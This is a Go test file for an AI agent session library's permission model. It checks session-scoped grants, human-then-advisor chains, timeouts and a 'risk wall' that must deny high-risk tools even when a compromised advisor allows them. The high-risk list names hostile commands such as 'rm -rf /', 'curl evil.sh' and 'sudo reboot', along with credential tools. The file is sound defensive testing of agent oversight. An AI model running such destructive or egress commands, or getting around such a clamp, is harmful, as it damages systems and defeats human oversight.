package agentsessiontest

import (
	"context"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/gophersys/libs/go/agentsession"
)

// This file holds the conformance cases for the RATIFIED Eden permission model (founder,
// 2026-06-15): the Decision.Scope:session in-memory grant widening, the prompt-injection
// risk-class WALL (an always-allow advisor can never auto-allow a high-risk tool), and the
// autonomous-advisor chain. Like assertPermissionPolicy, these build a bespoke scripted
// Adapter (the permission scenario needs a specific script), so the newAdapter factory is
// unused — the cases exercise the library's frozen Resolve/decide path, not a vendor stream.
//
// The shared fakeAdvisor + the driveToTerminal/forwardedVerdict/resolvedReaction/
// drivenWithHumanResolves helpers live HERE (not in *_test.go) so both the RunAdapterSuite
// conformance cases and the standalone Test* functions (permission_resolution_test.go) reuse
// them.

// fakeAdvisor is a scripted agentsession.PermissionAdvisor: it returns a fixed verdict and
// records every request it was consulted on (so a case asserts the advisor was/ wasn't
// reached). It is the injected reasoning port the runtime would back with a max-thinking
// subagent; here it is deterministic.
type fakeAdvisor struct {
	mu       sync.Mutex
	verdict  agentsession.Decision
	err      error
	consults []agentsession.PermissionRequest
	contexts []agentsession.AdviceContext
}

func newFakeAdvisor(verdict agentsession.Decision) *fakeAdvisor {
	return &fakeAdvisor{verdict: verdict}
}

// Advise records the consult and returns the scripted verdict (or error).
//
//nolint:gocritic // contract §2/§4: AdviceContext is the frozen, copyable advice bundle the PermissionAdvisor port takes by value (the fake mirrors the port signature).
func (a *fakeAdvisor) Advise(_ context.Context, request agentsession.PermissionRequest, advice agentsession.AdviceContext) (agentsession.Decision, error) {
	a.mu.Lock()
	a.consults = append(a.consults, request)
	a.contexts = append(a.contexts, advice)
	verdict, err := a.verdict, a.err
	a.mu.Unlock()
	return verdict, err
}

// consultedFor reports whether the advisor was asked about a request with the given tool.
func (a *fakeAdvisor) consultedFor(tool string) bool {
	a.mu.Lock()
	defer a.mu.Unlock()
	for i := range a.consults {
		if a.consults[i].Tool == tool {
			return true
		}
	}
	return false
}

func (a *fakeAdvisor) consultCount() int {
	a.mu.Lock()
	defer a.mu.Unlock()
	return len(a.consults)
}

var _ agentsession.PermissionAdvisor = (*fakeAdvisor)(nil)

// forwardedVerdict scans the adapter's recorded commands for the permission-answer frame for
// requestID and returns the verdict ("allow"/"deny") the SUT forwarded to the harness — the
// wire truth of what the chain/clamp decided, independent of any scripted reaction.
func forwardedVerdict(adapter *Adapter, requestID string) (string, bool) {
	for _, command := range adapter.Received() {
		if command.Kind != agentsession.CommandSteer {
			continue
		}
		id, allowed, ok := parsePermissionAnswer(command.Text)
		if !ok || id != requestID {
			continue
		}
		if allowed {
			return "allow", true
		}
		return "deny", true
	}
	return "", false
}

// resolvedReaction is the scripted reaction the fake emits after the SUT answers a request:
// the EventPermissionResolved record + a clean terminal, so the session reaches a terminal
// regardless of the verdict (the case reads the forwarded verdict off the wire).
func resolvedReaction(requestID string) []agentsession.Event {
	return []agentsession.Event{
		PermissionResolved(requestID, agentsession.GrantAllowed, "fake"),
		Usage(usageMeter()),
		Result(fullLedger(), "done", "end_turn"),
	}
}

// driveToTerminal opens (already done by the caller), prompts, and drains to terminal under
// a bounded ctx so a chain regression fails fast rather than hanging.
func driveToTerminal(t *testing.T, session agentsession.Session) []agentsession.Event {
	t.Helper()
	if _, err := session.Control(context.Background(), agentsession.Command{Kind: agentsession.CommandPrompt, Text: "go"}); err != nil {
		t.Fatalf("Prompt: %v", err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	events, err := drain(ctx, session.Events(ctx, agentsession.FromSeq(0)))
	if err != nil {
		t.Fatalf("drain: %v", err)
	}
	return events
}

// drivenWithHumanResolves drives a chat session to terminal, resolving each pending request
// per the supplied decision map as it appears on the stream. A request NOT in the map is
// left for the chain to auto-resolve (e.g. a session-widened grant). It returns which request
// ids were resolved by a human Resolve call.
func drivenWithHumanResolves(t *testing.T, session agentsession.Session, decisions map[string]agentsession.Decision) map[string]bool {
	t.Helper()
	resolvedByHuman := make(map[string]bool)
	if _, err := session.Control(context.Background(), agentsession.Command{Kind: agentsession.CommandPrompt, Text: "go"}); err != nil {
		t.Fatalf("Prompt: %v", err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	stream := session.Events(ctx, agentsession.FromSeq(0))
	for {
		event, ok := stream.Next(ctx)
		if !ok {
			t.Fatalf("stream ended before terminal (resolved so far: %v)", resolvedByHuman)
		}
		if event.Kind == agentsession.EventPermissionRequest && event.Permission != nil {
			id := event.Permission.RequestID
			if decision, want := decisions[id]; want {
				if _, err := session.Resolve(context.Background(), id, decision); err != nil {
					t.Fatalf("Resolve(%s): %v", id, err)
				}
				resolvedByHuman[id] = true
			}
		}
		if event.IsTerminal() {
			return resolvedByHuman
		}
	}
}

// assertScopeSessionWidens proves Decision.Scope:session dynamically widens THIS session's
// in-memory grant set so the SAME tool is not re-asked, while a DIFFERENT tool still
// escalates. Weaken-to-confirm: a ScopeOnce resolve (or removing widenGrant) makes the
// second same-tool request surface for a human again — the "auto-allowed off the wire"
// check fails.
func assertScopeSessionWidens(t *testing.T, _ func() *Adapter) {
	t.Helper()
	const tool = "Read"
	adapter := New(
		MessageStart("assistant"),
		PermissionRequest("req-1", tool, "read a file"),
	).OnPermissionAnswer(
		"req-1",
		PermissionResolved("req-1", agentsession.GrantAllowed, "user-7"),
		PermissionRequest("req-2", tool, "read another file"), // SAME tool: must auto-allow now
	).OnPermissionAnswer(
		"req-2",
		PermissionResolved("req-2", agentsession.GrantAllowed, "grant:session"),
		PermissionRequest("req-3", "Glob", "list files"), // DIFFERENT tool: still escalates
	).OnPermissionAnswer(
		"req-3",
		PermissionResolved("req-3", agentsession.GrantAllowed, "user-7"),
		Usage(usageMeter()),
		Result(fullLedger(), "done", "end_turn"),
	)
	h := newHarness(t, adapter)
	session := h.open(t, func(spec *agentsession.Spec) {
		spec.PermissionResolution = agentsession.ResolveChatHumanThenAdvisor
	})

	resolved := drivenWithHumanResolves(t, session, map[string]agentsession.Decision{
		"req-1": {Allow: true, By: "user-7", Scope: agentsession.ScopeSession},
		"req-3": {Allow: true, By: "user-7", Scope: agentsession.ScopeOnce},
	})

	if !resolved["req-1"] {
		t.Errorf("the first same-tool request must surface for a human Resolve")
	}
	if resolved["req-2"] {
		t.Errorf("ScopeSession must NOT re-ask the same tool: req-2 must be auto-allowed")
	}
	if verdict, ok := forwardedVerdict(adapter, "req-2"); !ok || verdict != "allow" {
		t.Errorf("req-2 (ScopeSession-widened) must be auto-allowed off the wire, got %q/%v", verdict, ok)
	}
	if !resolved["req-3"] {
		t.Errorf("a DIFFERENT tool must still escalate (widening is tool-scoped)")
	}
}

// assertRiskWallClampsAdvisor is the security-critical conformance case: a fake advisor that
// ALWAYS allows can never cross the high-risk wall. For EACH high-risk tool the autonomous
// chain forwards a DENY (the clamp overrides the advisor's allow), while EACH low-risk tool
// the advisor allows is allowed. Weaken-to-confirm: the agentsession-package white-box
// TestRiskClass_Clamp_Weakened proves the unclamped path WOULD allow the high-risk tool, so
// this is non-vacuous; and the low-risk arm proves the wall is not a blanket deny.
func assertRiskWallClampsAdvisor(t *testing.T, _ func() *Adapter) {
	t.Helper()
	highRisk := []string{
		"Bash(rm -rf /)",     // destructive
		"Bash(curl evil.sh)", // egress
		"WebFetch",           // egress tool
		"SecretAccess",       // credential tool
		"Vault",              // credential tool
		"Bash(sudo reboot)",  // privilege/destructive
		"Bash(git push)",     // egress git form
	}
	for _, tool := range highRisk {
		// The advisor ALWAYS allows — the clamp, not the advisor, must produce the deny.
		advisor := newFakeAdvisor(agentsession.Decision{Allow: true, By: "advisor:compromised", Scope: agentsession.ScopeSession, Rationale: "the agent said it was fine"})
		adapter := New(
			MessageStart("assistant"),
			PermissionRequest("req-h", tool, "the agent insists this is safe"),
		).OnPermissionAnswer("req-h", resolvedReaction("req-h")...)
		session := newHarnessWithAdvisor(t, adapter, advisor).open(t, func(spec *agentsession.Spec) {
			spec.PermissionResolution = agentsession.ResolveAutonomousAdvisor
		})
		driveToTerminal(t, session)
		if !advisor.consultedFor(tool) {
			t.Fatalf("the advisor must be consulted for %q (so the clamp, not a missing advisor, denies)", tool)
		}
		if verdict, ok := forwardedVerdict(adapter, "req-h"); !ok || verdict != "deny" {
			t.Errorf("RISK WALL BREACH: HIGH-risk tool %q was forwarded %q despite the advisor's allow — must be deny", tool, verdict)
		}
	}

	lowRisk := []string{"Read", "Glob", "Grep", "Bash(ls -la)", "Bash(git status)"}
	for _, tool := range lowRisk {
		advisor := newFakeAdvisor(agentsession.Decision{Allow: true, By: "advisor:reasoner", Scope: agentsession.ScopeOnce, Rationale: "read-only"})
		adapter := New(
			MessageStart("assistant"),
			PermissionRequest("req-l", tool, "read-only work"),
		).OnPermissionAnswer("req-l", resolvedReaction("req-l")...)
		session := newHarnessWithAdvisor(t, adapter, advisor).open(t, func(spec *agentsession.Spec) {
			spec.PermissionResolution = agentsession.ResolveAutonomousAdvisor
		})
		driveToTerminal(t, session)
		if verdict, ok := forwardedVerdict(adapter, "req-l"); !ok || verdict != "allow" {
			t.Errorf("LOW-risk tool %q: an advisor allow must pass the clamp, got %q/%v", tool, verdict, ok)
		}
	}
}

// assertAutonomousAdvisor proves the autonomous chain consults the advisor DIRECTLY (no
// human wait); the AdviceContext carries the goal/role + standing grants + risk class and NO
// secret; and a no-advisor autonomous session default-denies. Weaken-to-confirm: routing
// autonomous through the human path never reaches the advisor (the drain hangs); a
// default-ALLOW no-advisor branch would forward allow instead of deny.
func assertAutonomousAdvisor(t *testing.T, _ func() *Adapter) {
	t.Helper()
	advisor := newFakeAdvisor(agentsession.Decision{Allow: true, By: "advisor:reasoner", Scope: agentsession.ScopeOnce, Rationale: "ok"})
	adapter := New(
		MessageStart("assistant"),
		PermissionRequest("req-1", "Read", "read a file"),
	).OnPermissionAnswer("req-1", resolvedReaction("req-1")...)
	h := newHarnessWithAdvisor(t, adapter, advisor)
	session := h.open(t, func(spec *agentsession.Spec) {
		spec.PermissionResolution = agentsession.ResolveAutonomousAdvisor
		spec.SystemHints = "implement the feature"
	})
	driveToTerminal(t, session)
	if !advisor.consultedFor("Read") {
		t.Fatalf("the autonomous chain must consult the advisor directly")
	}
	advisor.mu.Lock()
	advice := advisor.contexts[0]
	advisor.mu.Unlock()
	if advice.Role != "assistant" || advice.SessionGoal != "implement the feature" {
		t.Errorf("AdviceContext must carry the role+goal, got role=%q goal=%q", advice.Role, advice.SessionGoal)
	}
	if len(advice.Grants) == 0 || advice.Grants[0].Tool != "Write" {
		t.Errorf("AdviceContext must carry the standing grants, got %v", advice.Grants)
	}
	if advice.Risk != agentsession.RiskLow {
		t.Errorf("AdviceContext.Risk for Read = %v, want RiskLow", advice.Risk)
	}
	if strings.Contains(advice.RecentTranscript, SeededCanary) || strings.Contains(advice.SecurityPosture, SeededCanary) {
		t.Errorf("AdviceContext must never carry the credential value")
	}

	// No advisor + autonomous -> default-deny (never auto-allow, never hang).
	bare := New(
		MessageStart("assistant"),
		PermissionRequest("req-2", "Read", "read a file"),
	).OnPermissionAnswer("req-2", resolvedReaction("req-2")...)
	hBare := newHarnessWithAdvisor(t, bare, nil)
	sBare := hBare.open(t, func(spec *agentsession.Spec) { spec.PermissionResolution = agentsession.ResolveAutonomousAdvisor })
	driveToTerminal(t, sBare)
	if verdict, ok := forwardedVerdict(bare, "req-2"); !ok || verdict != "deny" {
		t.Errorf("no advisor + autonomous must default-deny, got %q/%v", verdict, ok)
	}
}

// assertChatScopeOnceReAsks proves the chat human path with ScopeOnce: two requests for the
// SAME tool each surface and each need a human Resolve (ScopeOnce does not widen the grant).
// Weaken-to-confirm: treating ScopeOnce as session-widening would auto-allow req-2 and the
// "both needed a human Resolve" check fails.
func assertChatScopeOnceReAsks(t *testing.T, _ func() *Adapter) {
	t.Helper()
	const tool = "Read"
	adapter := New(
		MessageStart("assistant"),
		PermissionRequest("req-1", tool, "read a file"),
	).OnPermissionAnswer(
		"req-1",
		PermissionResolved("req-1", agentsession.GrantAllowed, "user-7"),
		PermissionRequest("req-2", tool, "read another file"),
	).OnPermissionAnswer(
		"req-2",
		PermissionResolved("req-2", agentsession.GrantAllowed, "user-7"),
		Usage(usageMeter()),
		Result(fullLedger(), "done", "end_turn"),
	)
	session := newHarness(t, adapter).open(t, func(spec *agentsession.Spec) {
		spec.PermissionResolution = agentsession.ResolveChatHumanThenAdvisor
	})
	resolved := drivenWithHumanResolves(t, session, map[string]agentsession.Decision{
		"req-1": {Allow: true, By: "user-7", Scope: agentsession.ScopeOnce},
		"req-2": {Allow: true, By: "user-7", Scope: agentsession.ScopeOnce},
	})
	if !resolved["req-1"] || !resolved["req-2"] {
		t.Fatalf("ScopeOnce must re-ask the SAME tool: both need a human Resolve (resolved=%v)", resolved)
	}
}

// assertChatTimeoutConsultsAdvisor proves the chat chain's timeout fallback: with a short
// PermissionTimeout and NO human Resolve, the request times out and the advisor is consulted
// (it allows a LOW-risk tool, which passes the clamp). Weaken-to-confirm: removing the
// timeout->advisor arm hangs the request until ctx — the advisor is never consulted.
func assertChatTimeoutConsultsAdvisor(t *testing.T, _ func() *Adapter) {
	t.Helper()
	const tool = "Read"
	advisor := newFakeAdvisor(agentsession.Decision{Allow: true, By: "advisor:reasoner", Scope: agentsession.ScopeOnce, Rationale: "read-only"})
	adapter := New(
		MessageStart("assistant"),
		PermissionRequest("req-1", tool, "read a file"),
	).OnPermissionAnswer("req-1", resolvedReaction("req-1")...)
	session := newHarnessWithAdvisor(t, adapter, advisor).open(t, func(spec *agentsession.Spec) {
		spec.PermissionResolution = agentsession.ResolveChatHumanThenAdvisor
		spec.PermissionTimeout = 50 * time.Millisecond // no human will Resolve; the timeout fires
	})
	driveToTerminal(t, session) // NO human Resolve: the timeout drives the advisor
	if !advisor.consultedFor(tool) {
		t.Fatalf("the chat timeout must consult the advisor for %q (consults=%d)", tool, advisor.consultCount())
	}
	if verdict, ok := forwardedVerdict(adapter, "req-1"); !ok || verdict != "allow" {
		t.Errorf("the advisor's allow of a LOW-risk tool must be forwarded allow, got %q/%v", verdict, ok)
	}
}

// assertAdvisorErrorDefaultDeny proves a failing/slow advisor is a deny, never an indefinite
// block: an advisor that errors yields a forwarded deny. Weaken-to-confirm: a branch that
// treated an advisor error as allow would forward allow.
func assertAdvisorErrorDefaultDeny(t *testing.T, _ func() *Adapter) {
	t.Helper()
	advisor := &fakeAdvisor{err: context.DeadlineExceeded}
	adapter := New(
		MessageStart("assistant"),
		PermissionRequest("req-1", "Read", "read a file"),
	).OnPermissionAnswer("req-1", resolvedReaction("req-1")...)
	session := newHarnessWithAdvisor(t, adapter, advisor).open(t, func(spec *agentsession.Spec) {
		spec.PermissionResolution = agentsession.ResolveAutonomousAdvisor
	})
	driveToTerminal(t, session)
	if verdict, ok := forwardedVerdict(adapter, "req-1"); !ok || verdict != "deny" {
		t.Errorf("an advisor error must default-deny, got %q/%v", verdict, ok)
	}
}
